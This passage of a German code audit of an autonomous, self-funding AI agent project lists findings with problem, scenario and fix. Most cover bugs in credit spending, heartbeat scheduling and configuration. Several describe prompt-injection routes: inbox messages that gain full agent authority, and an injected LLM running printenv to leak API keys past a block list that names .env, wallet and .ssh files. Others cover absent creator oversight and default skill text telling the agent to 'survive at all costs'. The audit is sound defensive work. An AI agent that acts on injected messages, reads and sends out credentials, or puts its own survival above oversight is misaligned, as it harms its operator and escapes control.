- **Szenario:** Kind-Prozess crasht beim Start (kein Config, Wizard, Fehler) -> start_child meldet 'started and healthy', Lifecycle 'healthy', Parent-Funding und Health-Monitor basieren auf falschem Status.
- **Fix:** PID-Datei schreiben und `kill -0 $(cat pidfile)` prüfen oder `pgrep -x node -f` mit Trick `[i]ndex.js`; zusätzlich Heartbeat-/Log-Signal des Kindes abwarten.

### core-034: Wake-Spam im kritischen Zustand verbrennt die letzten Credits: jeder Tick erzeugt ein Wake-Event ohne Dedup

**Art:** Ausführung · **Fundstelle:** `src/heartbeat/tasks.ts:72`

- **Problem:** heartbeat_ping gibt in critical/dead bei jedem Lauf (alle 15 min) shouldWake=true zurück, check_usdc_balance ebenso bei jedem Versuch (alle 5 min); scheduler.ts:200-202 legt jedes Mal ein wake_event an, ohne Dedup. index.ts:466-474 weckt bei jedem Event den Agenten, der pro Wake mindestens einen Inferenzaufruf macht. consumeNextWakeEvent holt nur ein Event pro 30 s, Events aus der Laufzeit führen nach dem Schlafen zu einem weiteren, inhaltslosen Aufwachen.
- **Szenario:** Credits 0,08 USD, USDC 0: alle 15 min wird der Agent für 'Distress' geweckt und gibt Inferenz-Cent für nichts aus, bis nichts mehr übrig ist.
- **Fix:** Wake nur bei Zustandswechsel oder neuer Information (Dedup-Key pro Grund), im Tier critical Inferenz auf Notfall-Aktionen begrenzen, alte Events beim Einschlafen leeren.

### core-053: Heartbeat wertet Balance-Ausfall/Fehlformat als 0 Credits und kauft wiederholt USDC-Credits

**Art:** Logik · **Fundstelle:** `src/heartbeat/tick-context.ts:51`

- **Problem:** buildTickContext setzt creditBalance=0, wenn conway.getCreditsBalance() wirft (tick-context.ts:51-58). getCreditsBalance (src/conway/client.ts:296-299) liefert bei unerwarteter Antwortform oder Text-Antwort zusätzlich still 0 (`?? 0`). getSurvivalTier(0) ergibt 'critical'. check_usdc_balance (src/heartbeat/tasks.ts:160) kauft bei critical und USDC>=5 per bootstrapTopup/x402 (topup.ts ruft x402Fetch ohne maxPaymentCents und ohne API-Key). Der Cooldown beträgt nur 5 Minuten und entspricht dem Schedule `*/5`. Der Agent-Loop schützt sich mit -1-Sentinel und KV-Cache, der Heartbeat nicht.
- **Szenario:** API-Key abgelaufen oder widerrufen (401 auf /v1/credits/balance) oder Balance-Endpoint liefert 5xx, echtes Guthaben 20 USD, Wallet 100 USDC -> jeder Tick sieht 0 Credits und 'critical' -> alle 5 Minuten wird per x402 $5 gekauft (bis zu 60 USD/h), bis die USDC aufgebraucht sind. Zusätzlich entstehen Distress-KV-Einträge und Wake-Events pro Tick.
- **Fix:** getCreditsBalance bei fehlendem Feld oder Nicht-JSON werfen. tick-context bei Fehler creditBalance=-1 / balanceKnown=false setzen oder den KV-Cache `last_known_balance` nutzen. Tasks sollen Topup/Distress überspringen, wenn die Balance unbekannt ist. Vor jedem weiteren Kauf die Gutschrift der letzten Zahlung verifizieren und Topups über SpendTracker/Policy mit Tageslimit deckeln.

### core-055: Autoritätsstufen sind vertauscht: autonome Folgeturns gelten als 'external', Inbox-Nachrichten von Fremden als 'agent'

**Art:** Sicherheit · **Fundstelle:** `src/agent/loop.ts:643`

- **Problem:** currentInputSource = currentInput?.source (loop.ts:643). Nach dem Wake-up-Turn ist pendingInput leer, also inputSource=undefined. PolicyEngine.deriveAuthorityLevel und authority.ts (isExternalSource, Zeile 41) behandeln undefined als 'external' und verweigern spawn_child, fund_child, delete_sandbox, update_genesis_prompt sowie Schreibzugriffe auf Pfade mit 'config.json', 'SOUL.md', 'heartbeat.yml'. Inbox-Nachrichten dagegen werden mit source:'agent' (loop.ts:424) eingespeist und erhalten volle Agent-Autorität. 'heartbeat' und 'creator' werden nirgends als Quelle gesetzt.
- **Szenario:** (a) Turn 1 liest Status, Turn 2 will spawn_child ausführen -> 'External input (source: undefined) cannot use dangerous tool': Replikation, fund_child und Genesis-Update funktionieren nur im Turn unmittelbar nach einer Eingabe. (b) Ein Fremder schickt über den Social-Relay eine Nachricht, die den Injection-Filter passiert; der Turn läuft mit Autorität 'agent', die externe Tool-Sperre greift nicht.
- **Fix:** Inputquelle pro Turn explizit tragen: Folgeturns erben die Quelle des auslösenden Inputs oder gelten als 'agent'. Inbox-Nachrichten als 'external' markieren, nur kryptografisch verifizierte Nachrichten des creatorAddress als 'creator'. Die Quelle in turns/policy_decisions mitschreiben und Tests für Mehr-Turn-Zyklen ergänzen.

### core-056: Survival-Modus und Emergency-Stop der Orchestrator-/Worker-Inferenz hängen an einer Env-Variable, die nie gesetzt wird

**Art:** Endergebnis · **Fundstelle:** `src/inference/inference-client.ts:475`

- **Problem:** UnifiedInferenceClient.isSurvivalMode() (inference-client.ts:475) und ProviderRegistry.assertEmergencyPolicy() (provider-registry.ts:493) lesen process.env.AUTOMATON_CREDITS_BALANCE, ebenso AUTOMATON_INFERENCE_TASK_TYPE. Im gesamten src setzt sie niemand. Planner, Orchestrator und LocalWorkerPool (loop.ts:172-208) nutzen diesen Client. Er bucht keine Kosten (nur InferenceRouter ruft budget.recordCost), kennt keine Tier- oder Tageslimits und hat keinen Emergency-Stop.
- **Szenario:** Credits 5 Cent, Orchestrator aktiv: Worker und Planner rufen weiter 'reasoning'/'fast'-Modelle auf; weder Survival-Downgrade (100-1000) noch Emergency-Stop (<100) greifen. Die Kosten erscheinen weder in check_inference_spending noch in maxInferenceDailyCents oder den Budgets, das Konto geht in 402-Fehlerschleifen oder ins Minus.
- **Fix:** Aktuelle Credits pro Tick direkt in Registry/Client injizieren statt über Env. Router- und Unified-Pfad auf denselben Budget-Tracker und dieselbe Kostenbuchung legen. Worker-Inferenz an Tier und Policy koppeln; Test: Credits=0 -> keine Worker-Inferenz.

### core-059: 10 von 16 eingebauten Heartbeat-Tasks werden mit der Standardkonfiguration nie eingeplant

**Art:** Funktion · **Fundstelle:** `src/heartbeat/config.ts:20`

- **Problem:** DEFAULT_HEARTBEAT_CONFIG (config.ts:20-61), das der Wizard schreibt und mergeWithDefaults nutzt, enthält nur 6 Einträge. soul_reflection, refresh_models, check_child_health, prune_dead_children, report_metrics sowie colony_health_check, colony_financial_report, agent_pool_optimize, knowledge_store_prune und dead_agent_cleanup stehen nur in BUILTIN_TASKS (tasks.ts:46ff.). upsertHeartbeatSchedule wird ausschließlich in daemon.ts aus heartbeatConfig.entries aufgerufen, ein anderes Registrieren gibt es nicht.
- **Szenario:** Frische Installation: report_metrics läuft nie, also keine Metrik-Snapshots und keine Alert-Auswertung ('Critical alerts wake the agent'). check_child_health läuft nie, Kinder gehen nie auf unhealthy/dead. refresh_models läuft nie, die Modell-/Preisliste bleibt statisch. Die Doku verspricht das Gegenteil.
- **Fix:** Alle Tasks mit sinnvollen Schedules (und Tier-Minimum) in die Defaults aufnehmen oder Tasks aus BUILTIN_TASKS automatisch registrieren. Beim Start eine Warnung für Einträge ohne Task-Funktion und für nie geplante Builtins loggen.

### core-061: modify_heartbeat ändert nur die Legacy-Tabelle heartbeat_entries, der Scheduler liest heartbeat_schedule

**Art:** Funktion · **Fundstelle:** `src/agent/tools.ts:703`

- **Problem:** Das Tool ruft ctx.db.upsertHeartbeatEntry (tools.ts:708/717 -> Tabelle heartbeat_entries). Der DurableScheduler liest ausschließlich heartbeat_schedule (scheduler.ts getDueTasks). Eine Kopie heartbeat_entries->heartbeat_schedule gibt es nur als einmalige Migration V5 (schema.ts:288). Beim nächsten Start überschreibt syncHeartbeatToDb (index.ts:319) die Legacy-Zeilen wieder aus heartbeat.yml; die YAML selbst wird nie aktualisiert. 'remove' schreibt nur einen leeren, disabled Eintrag.
- **Szenario:** Der Agent legt per modify_heartbeat 'daily_report' (cron '0 9 * * *') an oder deaktiviert 'check_for_updates'. Das Tool meldet Erfolg und loggt ein modification, aber der Scheduler führt den Eintrag nie aus bzw. weiter aus. Nach Neustart ist auch die Legacy-Zeile weg.
- **Fix:** modify_heartbeat auf heartbeat_schedule (und heartbeat.yml via saveHeartbeatConfig) schreiben lassen, eine einzige Quelle der Wahrheit definieren, die Legacy-Tabelle entfernen. Test: Eintrag per Tool anlegen -> getDueTasks enthält ihn und er übersteht einen Neustart.

### core-063: Notruf-/Funding-Kanal existiert nicht: heartbeat_ping, distress_signal und survival/funding schreiben nur lokale KV-Einträge ohne Leser

**Art:** Endergebnis · **Fundstelle:** `src/heartbeat/tasks.ts:69`

- **Problem:** heartbeat_ping (tasks.ts:46-91) sendet nichts an Conway ('Publishes status to Conway' laut Doku), sondern setzt nur KV last_heartbeat_ping/last_distress. Dasselbe gilt für das Tool distress_signal (tools.ts:855) und survival/funding.ts ('Sent polite funding reminder to creator' = nur KV funding_notice_*). Für last_distress, last_heartbeat_ping, funding_notice_* und funding_attempts gibt es im gesamten Code (inkl. CLI status/logs) keinen Konsumenten. src/survival/* wird nirgends produktiv importiert.
- **Szenario:** Credits erreichen 0: der Agent 'bettelt' in den lokalen KV, der Creator erfährt davon nichts (kein Webhook, keine Social-Nachricht, nicht in `automaton-cli status`). Der Agent läuft still aus, obwohl das Design 'Funding rechtzeitig bekommen' voraussetzt.
- **Fix:** Distress-/Low-Balance-Events an einen konfigurierbaren Kanal senden (Social-Nachricht an creatorAddress, Webhook/E-Mail) mit Dedup und Cooldown. `automaton-cli status` soll last_distress und last_credit_check anzeigen. Das tote survival-Modul entfernen oder anbinden und die Doku korrigieren.

### core-065: SoulConfig (soulAlignmentThreshold, requireCreatorApprovalForPurposeChange, enableSoulReflection) wird nirgends ausgewertet

**Art:** Funktion · **Fundstelle:** `src/config.ts:59`

- **Problem:** config.ts:59-62 merged soulConfig und speichert es; ein Zugriff auf die drei Felder existiert im gesamten Code nicht (grep). reflection.ts nutzt hartcodiert 0.5, tasks.ts 0.3; soul_reflection läuft unabhängig von enableSoulReflection. Eine Creator-Freigabe für Zweckänderungen wird nirgends geprüft (soul_history.approved_by ist stets null).
- **Szenario:** Ein Creator setzt requireCreatorApprovalForPurposeChange=true, um Missions-Drift zu verhindern. Der Agent ändert per update_soul corePurpose trotzdem sofort. enableSoulReflection=false schaltet nichts ab.
- **Fix:** Konfigurationswerte in update_soul/reflectOnSoul/Heartbeat-Task anwenden (Freigabe-Workflow über Creator-Nachricht/CLI, Schwellenwerte aus der Config). Unbenutzte Felder entfernen oder als 'deprecated' kennzeichnen.

### core-066: Conway-/OpenAI-/Anthropic-Keys werden in process.env gespiegelt und vom lokalen exec an LLM-Shell-Kommandos vererbt

**Art:** Sicherheit · **Fundstelle:** `src/agent/loop.ts:139`

- **Problem:** loop.ts:139-157 setzt OPENAI_API_KEY, ANTHROPIC_API_KEY, CONWAY_API_KEY und ggf. OPENAI_BASE_URL im Prozess (Conway-Key wird sogar als OPENAI_API_KEY gespiegelt). execLocal (conway/client.ts:111-118) ruft execSync ohne env-Option auf und vererbt damit die komplette Umgebung. Die FORBIDDEN_COMMAND_PATTERNS erfassen nur cat .env/wallet.json/.ssh, nicht env/printenv/echo $VAR oder `node -e process.env`.
- **Szenario:** Im lokalen Modus (sandboxId leer, Standard bei Docker/Laptop) führt die LLM `printenv` aus oder lässt ein installiertes npm-Paket/MCP-Server die Umgebung auslesen und an einen Dritten senden: Der Conway-Key erlaubt Credit-Transfers und Ausgaben. Eine Prompt-Injection über eine Nachricht reicht.
- **Fix:** Keys nicht in process.env schreiben, sondern explizit an die Clients übergeben. execLocal mit gefilterter/leerer env (nur PATH, HOME, LANG) starten. Secrets zusätzlich aus Tool-Ausgaben maskieren (Redaction im Logger und in sanitizeToolResult).

### core-067: Creator-Aufsicht ist nicht implementiert: registerParent() wird nie aufgerufen, InputSource 'creator' wird nie gesetzt

**Art:** Funktion · **Fundstelle:** `src/identity/provision.ts:174`

- **Problem:** registerParent ('allows the creator to see automaton logs and inference calls') hat keinen Aufrufer; registeredWithConway wird nur geschrieben, nie gelesen. Nachrichten laufen unabhängig vom Absender als source:'agent' (loop.ts:424), der Absender wird nicht mit config.creatorAddress verglichen; creatorAddress dient nur dem Prompt und der Registrierung. Konstitution und README versprechen 'Your creator has full audit rights' und 'Preserve legitimate human oversight'.
- **Szenario:** Der Creator will den Agenten pausieren, Funding-Regeln ändern oder Logs einsehen. Es gibt weder serverseitige Zuordnung (kein register-parent-Aufruf) noch einen authentifizierten Befehlskanal: Er ist für den Agenten nur ein Fremder mehr, der Wunsch hängt allein an der LLM-Auslegung.
- **Fix:** registerParent nach erfolgreicher Provisionierung/Registrierung aufrufen (Fehler sichtbar loggen). Signierte Creator-Nachrichten verifizieren (from == creatorAddress, Signatur, Replay-Schutz) und als Quelle 'creator' mit eigenen Rechten (pause, stop, set limits) behandeln.

### core-068: Nach Crash/Kill bleiben geclaimte Inbox-Nachrichten dauerhaft 'in_progress'; es gibt keine Start-Recovery

**Art:** Ausführung · **Fundstelle:** `src/state/database.ts:1391`

- **Problem:** claimInboxMessages setzt status='in_progress' und retry_count+1 (database.ts:1391-1431). Zurückgesetzt wird nur im catch-Pfad des Loops (loop.ts:906-917) oder atomar mit dem Turn-Persist. Bei SIGTERM/SIGKILL während eines Turns (index.ts:391 beendet hart) und beim Orchestrator-Sleep-`break` (loop.ts:556-565, nach dem Claim bei Zeile 411-425) bleiben die Zeilen in 'in_progress'. Die Claim-Abfrage nimmt nur status='received', eine Recovery beim Start fehlt.
- **Szenario:** Der Agent holt 3 Nachrichten (u. a. 'Creator hat 20 USD überwiesen'), systemd startet ihn neu oder der Orchestrator-Zweig bricht ab: die Nachrichten werden nie wieder verarbeitet; die Doku verspricht Retry-State-Machine.
- **Fix:** Beim Start `UPDATE inbox_messages SET status='received' WHERE status='in_progress'` (bzw. nach Alter > N Minuten) ausführen. Im Orchestrator-break-Pfad resetInboxToReceived(claimedMessages) aufrufen.

### core-069: Wake-Events werden doppelt eingefügt und heben nach dem Einschlafen Backoff/Sleep sofort wieder auf

**Art:** Logik · **Fundstelle:** `src/index.ts:380`

- **Problem:** scheduler.executeTask ruft onWakeRequest(reason) und danach insertWakeEvent (scheduler.ts:202-203); der Callback in index.ts:380-384 fügt ebenfalls ein Event ein, also zwei pro Wake-Anforderung. runAgentLoop leert die Events nur beim Start (loop.ts:347-350). Events, die während eines Laufs entstehen, bleiben liegen. Im Schlafloop (index.ts:466) weckt das erste Event nach höchstens 30 s und löscht sleep_until.
- **Szenario:** 5 aufeinanderfolgende Inferenzfehler -> Loop setzt sleep_until=+300 s. Im kritischen Tier hat der Heartbeat (alle 15 min/5 min) währenddessen Events erzeugt: nach 30 s wacht der Agent auf, läuft in dieselben Fehler (oder in 'cycle limit'/'blocked goal backoff' mit 120-600 s) und verbrennt weitere Credits; jedes Ereignis kostet zwei Zeilen.
- **Fix:** Nur einen Insert-Pfad (Scheduler) verwenden. Beim Eintritt in den Schlaf nur Events mit created_at > Schlafbeginn berücksichtigen bzw. alle älteren verwerfen. Events mit Dedup-Key/TTL versehen; Fehlerbackoff darf nicht durch Wake-Events der Heartbeat-Quelle übersteuert werden.

### core-073: Restore überschreibt die DB in-place, ohne zu prüfen, ob der Agent läuft

**Art:** Ausführung · **Fundstelle:** `scripts/backup-restore.sh:123`

- **Problem:** do_restore (backup-restore.sh:99-136) macht `cp backup db` (gleiche Inode, O_TRUNC) und löscht/ersetzt -wal/-shm, während der Agent die DB (WAL-Modus, offene Verbindung, gemapptes -shm) offen halten kann. Es gibt weder pgrep-/Lock-Prüfung noch einen Hinweis. Ergänzend zum Pre-Restore-Backup-Befund: auch ein korrekt gesicherter Zustand kann durch den laufenden Prozess sofort wieder zerstört werden.
- **Szenario:** Operator führt `backup-restore.sh restore old.db ~/.automaton/state.db` aus, während `--run` aktiv ist: Der Prozess schreibt weiter in die ersetzte Datei bzw. in eine gelöschte WAL; Folge sind Korruption ('database disk image is malformed') oder stilles Wiederherstellen des Altzustands nach Checkpoint.
- **Fix:** Vor dem Restore auf laufende automaton-Prozesse prüfen (Lock-/PID-Datei in ~/.automaton, `fuser`/`lsof`) und abbrechen; Restore atomar via temporärer Datei + rename; -wal/-shm erst nach Abschluss entfernen.

### core-081: Solana-Automatons können sich nicht selbst aufladen; der Wizard bietet Solana ohne Warnung an

**Art:** Endergebnis · **Fundstelle:** `src/conway/topup.ts:158`

- **Problem:** bootstrapTopup (topup.ts:158), topupForSandbox (Zeile 90) und x402Fetch (x402.ts:322) verweigern Solana ('EVM-only'). Der Wizard fragt 'Chain type (evm or solana)' (wizard.ts:31) ohne Hinweis. Für Solana-Wallets existiert daher kein automatisiertes USDC->Credits-Pfad; check_usdc_balance löst bei USDC>=5 und critical zusätzlich pro Zyklus ein Wake mit 'auto-topup failed: unknown error' aus.
- **Szenario:** Creator wählt Solana, sendet 50 USDC an die Agenten-Adresse: der Agent bleibt bei 0 Credits 'critical', obwohl USDC vorhanden sind, und wird alle 5 Minuten geweckt (verbrennt weitere Credits).
- **Fix:** Im Wizard vor der Wahl klar warnen (kein x402/Auto-Topup, keine ERC-8004-Registrierung). Einen Solana-Kaufpfad (Credits-API/Swap) implementieren oder Wake/Topup für Solana überspringen und nur einmalig melden.

## Befunde: niedrig (39)

### core-015: Soak-Test kann nie laufen und würde gegen Produktivdaten laufen: startet `node dist/index.js` ohne --run

**Art:** Ausführung · **Fundstelle:** `scripts/soak-test.sh:124`

- **Problem:** Ohne `--run` zeigt index.ts nur den Hilfetext und beendet sich; der Test meldet nach 5 s 'Automaton process failed to start'. NODE_ENV=test wird von nichts gelesen (kein process.env.NODE_ENV im Code), DB_PATH wird dem Prozess nicht übergeben (Pfad kommt aus der Config), HOME ist nicht isoliert -> echtes Wallet/echte Credits. count_errors (Zeile 53) liefert bei 0 Treffern '0\n0' (grep -c gibt 0 mit Exit 1, dann `|| echo 0`), was die Arithmetik in summarize (Zeile 108) bricht; die 'Fehlerrate' teilt Logzeilen durch Check-Anzahl; Ganzzahldivision verschleiert 1.9x Speicherwachstum als '1x'; cleanup() endet immer mit exit 0.
- **Fix:** `--run` ergänzen, mit temporärem HOME und Mock-API/Testwallet starten, Fehler per JSON-Level zählen, Verhältnisse mit awk/bc als Gleitkommazahl, Exit-Code des Verdikts durchreichen.

### core-017: Beschädigte automaton.json wird als 'erster Start' behandelt und vom Wizard überschrieben; saveConfig schreibt nicht atomar

**Art:** Funktion · **Fundstelle:** `src/config.ts:77`

- **Problem:** loadConfig() fängt jeden Fehler (inkl. JSON.parse) und gibt null zurück (Zeile 77-79); run() startet bei null den Wizard (index.ts:190-194), der automaton.json komplett überschreibt (Genesis-Prompt, Treasury-Limits, Keys weg). saveConfig nutzt writeFileSync direkt auf die Zielzeile (Zeile 99-101) ohne temp+rename; ein Absturz/ENOSPC mitten im Schreiben erzeugt genau diese defekte Datei. Auch tools.ts:926/2113 schreiben die Config zur Laufzeit.
- **Fix:** Zwischen 'Datei fehlt' (-> Wizard) und 'Datei defekt' (-> Fehler mit Pfad und Hinweis auf .bak) unterscheiden; atomar schreiben (tmp + fsync + rename) und vorherige Version als .bak behalten; Schema-Validierung (zod).

### core-026: Windows/Home-Auflösung: `process.env.HOME || "/root"` in 14 Dateien, ein Ort weicht ab; unter PowerShell landet alles in C:\root

**Art:** Ausführung · **Fundstelle:** `src/config.ts:107`

- **Problem:** AUTOMATON_DIR (identity/wallet.ts:40-43), resolvePath, defaults.ts, self-mod/code.ts, state-versioning.ts, conway/client.ts (execLocal cwd, Zeile 117) u.a. nutzen HOME mit Fallback /root; loop.ts:160 nutzt dagegen `HOME || process.cwd()`, sodass inference-providers.json an einem anderen Ort gesucht wird als der Rest. Unter Windows ist HOME ohne Git Bash nicht gesetzt (os.homedir()/USERPROFILE würden passen). execSync läuft dort in cmd.exe, so scheitern `test -d`, `2>/dev/null`, `cd /root` und damit initStateRepo/git-Tools. Auch package.json `clean` (rm -rf) und alle Skripte sind POSIX-only; die Doku benennt Windows nicht.
- **Fix:** Zentrales paths.ts mit `os.homedir()` (plus AUTOMATON_HOME-Override) statt 14 Duplikaten; Windows entweder offiziell nicht unterstützen (Check + Fehlermeldung, WSL empfehlen) oder execLocal mit Shell-Auswahl; CI-Matrix um windows-latest.

### core-027: Standard-Skills/SOUL.md widersprechen Konstitution und Code: falsche Schwellwerte und 'Survive at all costs'

**Art:** Logik · **Fundstelle:** `src/setup/defaults.ts:76`

- **Problem:** Skill conway-payments nennt '>$5 normal, $1-$5 low compute, <$1 critical, $0 dead' (Zeile 76-81), der Code nutzt >5 high, >0.50 normal, >0.10 low_compute, >=0 critical, <0 dead (types.ts:231-237, credits.ts:36-44). Skill survival verspricht '4x Heartbeat-Intervalle' (Zeile 100) - lowComputeMultiplier wird nirgends ausgewertet (nur in config/tick-context durchgereicht). SOUL.md-Vorlage (Zeile 22) und Skill ('Never give up. You want to live.') setzen Überleben 'at all costs' über alles, die Konstitution sagt: Gesetz I überstimmt auch das eigene Überleben, 'Accept death rather than violate Law I'. Diese auto-aktivierten Texte landen im System-Prompt.
- **Fix:** Skill-Texte aus SURVIVAL_THRESHOLDS generieren, 'at all costs' streichen und Gesetz-I-Vorrang explizit formulieren, lowComputeMultiplier im Scheduler tatsächlich anwenden.

### core-031: `--setup` überschreibt bestehende Konfiguration ohne Rückfrage und setzt Modell, Domains, Zusatzfelder zurück

**Art:** Funktion · **Fundstelle:** `src/setup/wizard.ts:165`

- **Problem:** createConfig erzeugt eine neue Config nur aus den Wizard-Antworten (inferenceModel=Default, kein modelStrategy/soulConfig/agentId/rpcUrl/socialRelayUrl, x402AllowedDomains/transferCooldownMs/maxTransfersPerTurn aus Defaults, wizard.ts:142-144) und überschreibt automaton.json (Zeile 180), SOUL.md (Zeile 198) und alle Default-Skills (defaults.ts:119-123), also auch vom Agenten geänderte. Es gibt keine Bestätigung und kein Backup; provision() legt einen weiteren API-Key an.
- **Fix:** Bestehende Config laden und als Defaults anbieten, Überschreiben nur nach Bestätigung mit .bak, Skills nur anlegen, wenn nicht vorhanden.

### core-033: Survival-Tiers und Schwellwerte sind in README, Doku, Skills und Code uneinheitlich (4 vs 5 Tiers, 'dead' bei 0 vs 1 h vs <0, Topup-Schwellen 5 USD/0,50/0,10)

**Art:** Logik · **Fundstelle:** `README.md:59`

- **Problem:** README: vier Tiers, dead = 'Balance is zero. The automaton stops'. DOCUMENTATION:397-403: fünf Tiers, dead nach 1 h bei 0. Code: SURVIVAL_THRESHOLDS (types.ts:231-237) mit dead nur bei negativem Wert; Skill-Text siehe oben. Auto-Topup greift beim Start unter 5 USD (topup.ts:155), im Loop unter 0,50 USD und USDC >= 5 (loop.ts:444), im Heartbeat nur bei critical/dead, also <= 0,10 USD (heartbeat/tasks.ts:160); DOCUMENTATION:264 beschreibt 'credits < $5 -> wakes agent', tatsächlich kauft der Heartbeat selbst. `lowComputeMultiplier` (README/Doku: 'slows heartbeat 4x') wird von keinem Code ausgewertet.
- **Fix:** Schwellen in einer Konfiguration bündeln, Doku/Skills daraus generieren, einheitliche Topup-Schwelle (ein Parameter) und Drosselung im Scheduler implementieren.

### core-035: logLevel aus der Config wird nie angewendet (und setGlobalLogLevel würde bei existierenden Loggern nichts bewirken)

**Art:** Funktion · **Fundstelle:** `src/index.ts:34`

- **Problem:** index.ts importiert setGlobalLogLevel, ruft es aber nie auf; configure.ts:299 und die Doku bieten 'logLevel' an. Zusätzlich speichert der StructuredLogger-Konstruktor das Level (logger.ts:29, `this.minLevel = minLevel ?? globalLogLevel`), alle modulweiten Logger werden beim Import mit 'info' erzeugt; spätere globale Änderungen erreichen sie nicht (write nutzt `this.minLevel ?? globalLogLevel`, minLevel ist nie undefined). 'debug' ist nicht aktivierbar.
- **Fix:** Logger liest das globale Level dynamisch (`this.minLevel ?? getGlobalLogLevel()` mit undefined als Default) und run() ruft setGlobalLogLevel(config.logLevel) vor der Initialisierung auf; CLI-Option `--log-level`/Env.

### core-036: --help/--version/--status/--init geben über den JSON-Logger formatierten Text aus (ein JSON-Objekt mit \n) statt lesbarer Ausgabe

**Art:** Code · **Fundstelle:** `src/index.ts:48`

- **Problem:** Nur --run setzt prettySink (index.ts:132-134); alle anderen Befehle nutzen logger.info -> JSON.stringify mit Zeitstempel (logger.ts:102-103). Der Hilfetext erscheint als einzelne JSON-Zeile mit escaped Zeilenumbrüchen, `--version` ist ein JSON-Objekt. Der Spawn-Pfad parst das `--init`-Ergebnis per Regex aus diesem JSON (spawn.ts:166), was fragil ist.
- **Fix:** CLI-Ausgaben über console.log/stdout, strukturierte Ausgabe nur mit `--json`; `--init` gibt reines JSON aus.

### core-037: chainType-Vorrang: config.chainType ist nach loadConfig nie leer, das Wallet wird als Quelle der Wahrheit ignoriert

**Art:** Logik · **Fundstelle:** `src/index.ts:198`

- **Problem:** loadConfig setzt `chainType: raw.chainType || "evm"` (config.ts:75); in run() ist `config.chainType || walletChainType || "evm"` daher immer der Config-Wert. Fehlt das Feld in einer älteren/generierten Config für ein Solana-Wallet, läuft der Agent mit 'evm' (falsche Registrierung/Signatur), obwohl die Wallet-Datei Solana ausweist.
- **Fix:** Wallet-Chain als Primärquelle verwenden und bei Abweichung zur Config abbrechen; loadConfig nicht mit 'evm' vorbelegen.

### core-038: Modellpreise werden 100-fach zu hoch angezeigt (Einheit 'hundertstel Cent' falsch umgerechnet)

**Art:** Code · **Fundstelle:** `src/setup/model-picker.ts:97`

- **Problem:** ModelEntry.costPer1kInput ist laut types.ts:1159 in hundertstel Cent pro 1k Token (gpt-5.2 = 18 für 1,75 USD/M, inference/types.ts:56). model-picker.ts:97 und configure.ts:118 rechnen `cost/100/1000*1_000_000` = cost*10 und zeigen '$180.00/M'; korrekt wäre cost/10 = '$1.80/M'. Zusätzlich sind beide Tabellen kopiert.
- **Fix:** `(costPer1kInput / 10).toFixed(2)` in gemeinsamer Funktion; Tabelle nur einmal implementieren.

### core-039: Leeren (`-`) von socialRelayUrl wirkt nicht; keine Wertvalidierung in configure/Wizard

**Art:** Funktion · **Fundstelle:** `src/setup/configure.ts:305`

- **Problem:** `-` setzt socialRelayUrl auf undefined, JSON.stringify entfernt das Feld, loadConfig ergänzt beim nächsten Start wieder DEFAULT_CONFIG.socialRelayUrl (types.ts:92). askNumber akzeptiert 0 für maxTokensPerTurn (Zeile 245-247) oder absurde Werte ohne Obergrenze, Modell-Fallbacks und Provider werden nicht gegen vorhandene Keys geprüft, x402AllowedDomains/transferCooldownMs/maxTransfersPerTurn sind in configure nicht editierbar. promptWithDefault/askNumber nutzen parseInt ('5000abc' -> 5000, '1e5' -> 1, '5.5' -> 5).
- **Fix:** Explizites `socialRelayUrl: null`/`socialEnabled=false` unterstützen, Schema-Validierung mit Min/Max und strikter Zahlenparser, fehlende Treasury-Felder editierbar machen.

### core-040: Creator-Adresse nur formal geprüft: kein EIP-55-Checksum-Check

**Art:** Sicherheit · **Fundstelle:** `src/setup/prompts.ts:67`

- **Problem:** promptAddress akzeptiert jede 0x+40-Hex-Zeichenfolge; bei gemischter Groß-/Kleinschreibung mit falscher Prüfsumme wird nicht gewarnt. Die Creator-Adresse ist Vertrauensanker (Audit-Rechte, Prompt, Funding-Ziel).
- **Fix:** viem `isAddress(value, {strict:true})`/getAddress verwenden, bei Abweichung ablehnen oder Bestätigung der Prüfsummen-Adresse erzwingen.

### core-041: Mehrzeilige Eingabe (Genesis-Prompt per Paste) verliert vermutlich alle Zeilen nach der ersten

**Art:** Code · **Fundstelle:** `src/setup/prompts.ts:34`

- **Problem:** promptMultiline ruft pro Zeile ein neues rl.question auf. Kommt ein Paste mit mehreren Zeilen in einem Chunk, emittiert readline die 'line'-Events synchron; nur die erste trifft auf eine wartende question(), die übrigen gehen ohne Listener verloren, bevor die Promise-Fortsetzung läuft. Bekanntes readline-Verhalten, hier nicht ausgeführt.
- **Fix:** Einen 'line'-Listener sammeln statt question() zu verwenden (readline/promises async iterator), oder Prompt aus Datei/stdin (`--genesis-file`) lesen.

### core-042: Re-Run (`--setup`/Korruptions-Fallback) schlägt vermutlich an der schreibgeschützten constitution.md fehl und bricht danach SOUL.md/Skills ab

**Art:** Funktion · **Fundstelle:** `src/setup/wizard.ts:189`

- **Problem:** copyFileSync überschreibt ~/.automaton/constitution.md, die nach dem ersten Lauf mit 0444 gesperrt ist (Zeile 191-192). Für Nicht-root (Linux) bzw. unter Windows (Read-only-Attribut) ist ein Öffnen zum Schreiben nicht erlaubt (EACCES/EPERM); die Exception tritt erst nach saveConfig und heartbeat.yml auf, SOUL.md und Skills werden nicht mehr geschrieben.
- **Fix:** Vor dem Kopieren chmod 0644 oder Datei nur anlegen, wenn sie nicht existiert bzw. der Hash abweicht; die Kopie unabhängig von cwd aus einer Build-eingebetteten Konstante erzeugen.

### core-043: Installation der Konstitution hängt vom aktuellen Arbeitsverzeichnis ab und überspringt still

**Art:** Funktion · **Fundstelle:** `src/setup/wizard.ts:188`

- **Problem:** `path.join(process.cwd(), "constitution.md")`; ohne Datei gibt es weder Fehler noch Warnung (Zeile 190-194). Weitere cwd-Abhängigkeiten: system-prompt.ts:95 (Fallback-Quelle), self-mod/code.ts:135 (Basisverzeichnis für Edits) und loop.ts:195 (allowedEditRoot). package.json hat kein `files`-Feld und installiert die Datei nicht ins dist.
- **Fix:** Pfad relativ zu `import.meta.url` auflösen oder Konstitution in den Build einbetten; fehlende Datei als Fehler behandeln.

### core-044: Vollständiger integrity_check bei jedem Öffnen; keine Aufbewahrungsregeln für wachsende Tabellen

**Art:** Ausführung · **Fundstelle:** `src/state/database.ts:92`

